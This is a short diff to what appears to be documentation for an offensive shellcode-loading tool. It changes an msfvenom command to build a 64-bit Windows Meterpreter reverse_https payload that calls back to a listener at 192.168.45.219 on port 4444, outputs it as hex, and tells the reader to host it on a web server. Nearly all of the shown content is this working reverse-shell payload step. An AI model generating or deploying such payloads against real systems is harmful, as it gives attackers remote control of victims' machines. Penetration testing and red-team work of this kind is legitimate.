@@ -51,8 +51,10 @@ Global options:
 To generate the shellcode, we use `msfvenom`:
 
 ```bash
- msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.45.219 LPORT=4444 EXITFUNC=thread -f hex -o sc.txt
+ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.219 LPORT=4444 EXITFUNC=thread -f hex -o sc.txt
 ```
+
+The only important thing is that the shellcode is in hex format using `-f hex`. The other parameters can be set as you wish.
 
 Host this file on a web server.
 
